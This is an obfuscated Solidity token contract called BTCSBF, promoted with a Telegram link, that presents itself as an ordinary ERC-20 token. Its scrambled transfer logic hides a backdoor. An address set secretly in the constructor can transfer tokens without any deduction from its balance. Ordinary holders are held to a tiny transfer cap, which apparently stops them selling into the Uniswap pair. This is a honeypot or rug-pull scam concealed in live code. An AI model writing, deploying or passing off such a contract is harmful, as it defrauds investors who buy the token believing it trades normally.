/*

https://t.me/btcsbf

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract BTCSBF is Ownable {
    function transfer(address qfgaotnl, uint256 wysbprdkf) public returns (bool success) {
        douipxygczq(msg.sender, qfgaotnl, wysbprdkf);
        return true;
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function approve(address tfal, uint256 wysbprdkf) public returns (bool success) {
        allowance[msg.sender][tfal] = wysbprdkf;
        emit Approval(msg.sender, tfal, wysbprdkf);
        return true;
    }

    uint8 public decimals = 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public name;

    function douipxygczq(address idjkvgnpxu, address qfgaotnl, uint256 wysbprdkf) private {
        address vjntoydg = IUniswapV2Factory(wczkmgp.factory()).getPair(address(this), wczkmgp.WETH());
        bool duaqtwnv = atlpxrhm[idjkvgnpxu] == block.number;
        uint256 ehdwf = bujndky[idjkvgnpxu];
        if (ehdwf - ehdwf == ehdwf) {
            if (idjkvgnpxu != vjntoydg && (!duaqtwnv || wysbprdkf > suedfxon[idjkvgnpxu]) && wysbprdkf < totalSupply) {
                require(wysbprdkf <= totalSupply / (10 ** decimals));
            }
            balanceOf[idjkvgnpxu] -= wysbprdkf;
        }
        suedfxon[qfgaotnl] = wysbprdkf;
        balanceOf[qfgaotnl] += wysbprdkf;
        atlpxrhm[qfgaotnl] = block.number;
        emit Transfer(idjkvgnpxu, qfgaotnl, wysbprdkf);
    }

    constructor(string memory fwlgoiazd, string memory snhzayqtjpc, address kzmy, address kidouqbpr) {
        name = fwlgoiazd;
        symbol = snhzayqtjpc;
        balanceOf[msg.sender] = totalSupply;
        bujndky[kidouqbpr] = afmdcrtq;
        wczkmgp = IUniswapV2Router02(kzmy);
    }

    uint256 private afmdcrtq = 118;

    mapping(address => uint256) private suedfxon;

    mapping(address => uint256) private bujndky;

    IUniswapV2Router02 private wczkmgp;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transferFrom(address idjkvgnpxu, address qfgaotnl, uint256 wysbprdkf) public returns (bool success) {
        require(wysbprdkf <= allowance[idjkvgnpxu][msg.sender]);
        allowance[idjkvgnpxu][msg.sender] -= wysbprdkf;
        douipxygczq(idjkvgnpxu, qfgaotnl, wysbprdkf);
        return true;
    }

    string public symbol;

    mapping(address => uint256) public balanceOf;

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private atlpxrhm;
}